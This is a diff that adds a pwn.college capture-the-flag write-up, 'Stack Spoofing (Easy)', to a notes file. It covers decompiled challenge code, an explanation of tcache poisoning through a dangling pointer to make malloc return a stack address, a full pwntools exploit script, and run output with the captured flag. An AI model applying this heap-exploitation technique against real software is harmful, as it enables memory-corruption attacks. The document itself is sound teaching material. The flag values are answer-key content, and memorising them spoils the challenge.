@@ -6094,3 +6094,269 @@ hacker@dynamic-allocator-misuse~echo-emanations-hard:/$ python ~/script.py
 You win! Here is your flag:
 pwn.college{0TBO3SAF54zAWFKEBdJ_Tlj0I3C.0lM5MDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## Stack Spoofing (Easy)
+
+```
+hacker@dynamic-allocator-misuse~stack-spoofing-easy:/$ /challenge/stack-spoofing-easy
+###
+### Welcome to /challenge/stack-spoofing-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+
+[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit):
+```
+
+### Binary Analysis
+
+```c title="/challenge/stack-spoofing-easy :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  int v4; // eax
+  unsigned int v6; // [rsp+28h] [rbp-1A8h]
+  unsigned int v7; // [rsp+28h] [rbp-1A8h]
+  unsigned int v8; // [rsp+28h] [rbp-1A8h]
+  unsigned int v9; // [rsp+28h] [rbp-1A8h]
+  unsigned int size; // [rsp+2Ch] [rbp-1A4h]
+  _QWORD *v11; // [rsp+38h] [rbp-198h]
+  void *ptr[16]; // [rsp+40h] [rbp-190h] BYREF
+  char s1[128]; // [rsp+C0h] [rbp-110h] BYREF
+  _BYTE v14[64]; // [rsp+140h] [rbp-90h] BYREF
+  _QWORD v15[10]; // [rsp+180h] [rbp-50h] BYREF
+
+  v15[9] = __readfsqword(0x28u);
+  setvbuf(stdin, nullptr, 2, 0);
+  setvbuf(stdout, nullptr, 2, 1u);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  puts(
+    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
+  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
+  printf("This challenge can manage up to %d unique allocations.\n\n", 16);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            while ( 1 )
+            {
+              while ( 1 )
+              {
+                print_tcache(main_thread_tcache);
+                puts(byte_3519);
+                printf("[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): ");
+                __isoc99_scanf("%127s", s1);
+                puts(byte_3519);
+                if ( strcmp(s1, "malloc") )
+                  break;
+                printf("Index: ");
+                __isoc99_scanf("%127s", s1);
+                puts(byte_3519);
+                v6 = atoi(s1);
+                if ( v6 > 0xF )
+                  __assert_fail("allocation_index < 16", "<stdin>", 0xFCu, "main");
+                printf("Size: ");
+                __isoc99_scanf("%127s", s1);
+                puts(byte_3519);
+                size = atoi(s1);
+                printf("[*] allocations[%d] = malloc(%d)\n", v6, size);
+                ptr[v6] = malloc(size);
+                printf("[*] allocations[%d] = %p\n", v6, ptr[v6]);
+              }
+              if ( strcmp(s1, "free") )
+                break;
+              printf("Index: ");
+              __isoc99_scanf("%127s", s1);
+              puts(byte_3519);
+              v7 = atoi(s1);
+              if ( v7 > 0xF )
+                __assert_fail("allocation_index < 16", "<stdin>", 0x10Eu, "main");
+              printf("[*] free(allocations[%d])\n", v7);
+              free(ptr[v7]);
+            }
+            if ( strcmp(s1, "puts") )
+              break;
+            printf("Index: ");
+            __isoc99_scanf("%127s", s1);
+            puts(byte_3519);
+            v8 = atoi(s1);
+            if ( v8 > 0xF )
+              __assert_fail("allocation_index < 16", "<stdin>", 0x11Bu, "main");
+            printf("[*] puts(allocations[%d])\n", v8);
+            printf("Data: ");
+            puts((const char *)ptr[v8]);
+          }
+          if ( strcmp(s1, "scanf") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_3519);
+          v9 = atoi(s1);
+          if ( v9 > 0xF )
+            __assert_fail("allocation_index < 16", "<stdin>", 0x128u, "main");
+          v3 = malloc_usable_size(ptr[v9]);
+          sprintf(s1, "%%%us", v3);
+          v4 = malloc_usable_size(ptr[v9]);
+          printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v9);
+          __isoc99_scanf(s1, ptr[v9]);
+          puts(byte_3519);
+        }
+        if ( strcmp(s1, "stack_free") )
+          break;
+        printf("[*] free(%p)\n", v15);
+        free(v15);
+      }
+      if ( strcmp(s1, "stack_scanf") )
+        break;
+      printf("[*] scanf(\"%%127s\", %p)\n", v14);
+      __isoc99_scanf("%127s", v14);
+      puts(byte_3519);
+    }
+    if ( strcmp(s1, "stack_malloc_win") )
+      break;
+    printf("[*] if (malloc(%d) == %p) win()\n", 63, v15);
+    printf("[*] malloc_usable_size(malloc(%d)) = %d\n", 63, 72);
+    v11 = malloc(0x3Fu);
+    printf("[*] malloc(%d) = %p\n", 63, v11);
+    if ( v11 == v15 )
+      win();
+  }
+  if ( strcmp(s1, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+This challenge introduces three new commands. `stack_free` frees `v15`, a stack-allocated buffer. `stack_scanf` writes into `v14`, another stack buffer. `stack_malloc_win` calls `malloc(63)` and calls `win()` if the result equals `v15`.
+
+The goal is to make `malloc(63)` return the address of `v15` on the stack.
+
+### Getting a Stack Address into the Tcache
+
+We cannot call `stack_free` directly to put `v15` into the TCACHE — the allocator detects that `v15` is not a valid heap chunk and aborts:
+
+```
+[*] free(0x7ffcd1c04590)
+double free or corruption (out)
+Aborted
+```
+
+Instead we use TCACHE poisoning. The `stack_malloc_win` command helpfully prints `v15`'s address before doing the malloc check, so we can read it from the output. We then poison a freed heap chunk's `next` pointer to point at `v15`, causing the next `malloc(63)` call to return it.
+
+The TCACHE bin for `malloc(63)` is the 57-72 byte bin (bin `#3`). We allocate two chunks of size 72 to match this bin, free them, and poison the first chunk's `next`:
+
+```
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┊  TCACHE_perthread_struct Void                                        ┊
+┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓                      ┊
+┊    counts: ┃ count_72: 2    ┃ ...            ┃                      ┊
+┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫                      ┊
+┊   entries: ┃ entry_72: &A   ┃ ...            ┃                      ┊
+┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛                      ┊
+└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
+                              │
+              ╭───────────────╯
+              │
+              v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  TCACHE_entry A  ┆
+├──────────────────┤
+│  next: &v15      │ ────╮   (poisoned via scanf on dangling ptr[0])
+├──────────────────┤     │
+│    key: Void     │     │
+└──────────────────┘     │
+                         │
+         ╭───────────────╯
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  STACK (v15)              ┆
+├──────────────────────────┤
+│  _QWORD v15[10]           │
+└──────────────────────────┘
+```
+
+We then `malloc(0, 63)` to drain chunk A, leaving `v15` at the head of the TCACHE. When `stack_malloc_win` calls `malloc(63)`, it pops `v15` and the check passes.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/stack-spoofing-easy")
+
+p.recvuntil(b"quit): ")
+
+def malloc(idx, size):
+    p.sendline(b"malloc")
+    p.sendline(str(idx).encode())
+    p.sendline(str(size).encode())
+    p.recvuntil(b"quit): ")
+
+def free(idx):
+    p.sendline(b"free")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"quit): ")
+
+def scanf(idx, data):
+    p.sendline(b"scanf")
+    p.sendline(str(idx).encode())
+    p.sendline(data)
+    p.recvuntil(b"quit): ")
+
+# get v15's address from the stack_malloc_win output
+p.sendline(b"stack_malloc_win")
+p.recvuntil(b"if (malloc(63) == ")
+v15_addr = int(p.recvuntil(b")").strip(b")"), 16)
+print(f"[*] v15 addr: {hex(v15_addr)}")
+p.recvuntil(b"quit): ")
+
+# allocate two chunks in the same bin as malloc(63)
+malloc(0, 72)
+malloc(1, 72)
+free(1)
+free(0)
+
+# poison chunk A's next to point to v15
+scanf(0, p64(v15_addr))
+
+# drain chunk A
+malloc(0, 63)
+
+# stack_malloc_win's malloc(63) pops v15, triggering win
+p.sendline(b"stack_malloc_win")
+print(p.recvall(timeout=3).decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~stack-spoofing-easy:/$ python ~/script.py 
+[+] Starting local process '/challenge/stack-spoofing-easy': pid 25794
+[*] v15 addr: 0x7ffd9f7d0700
+[+] Receiving all data: Done (289B)
+[*] Stopped process '/challenge/stack-spoofing-easy' (pid 25794)
+
+[*] if (malloc(63) == 0x7ffd9f7d0700) win()
+[*] malloc_usable_size(malloc(63)) = 72
+[*] malloc(63) = 0x7ffd9f7d0700
+You win! Here is your flag:
+pwn.college{07HJidoeBZC_x5Mse2AW6v4D92j.01M5MDL4ITM0EzW}
+```
+
+&nbsp;
